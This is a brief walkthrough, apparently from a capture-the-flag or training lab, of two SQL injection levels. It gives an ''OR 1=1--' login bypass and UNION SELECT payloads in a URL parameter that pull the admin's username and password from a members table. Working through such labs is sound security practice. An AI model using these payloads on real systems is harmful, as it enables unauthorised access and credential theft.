# SQLi Levels
## Lvl 1
SQL injection 101
```
'OR 1=1--
```
## Lvl 2
Select 'Browse members' and select any letter. The URL modifies to ```'sqli/2?browse&q=a'```

Modify to ```'=a'``` to
```UNION SELECT all username,2 FROM members WHERE admin=1--'``` which returns admin username bellamond.

In order to retrieve the password ```=a' UNION SELECT all password,2 FROM members WHERE admin=1--```
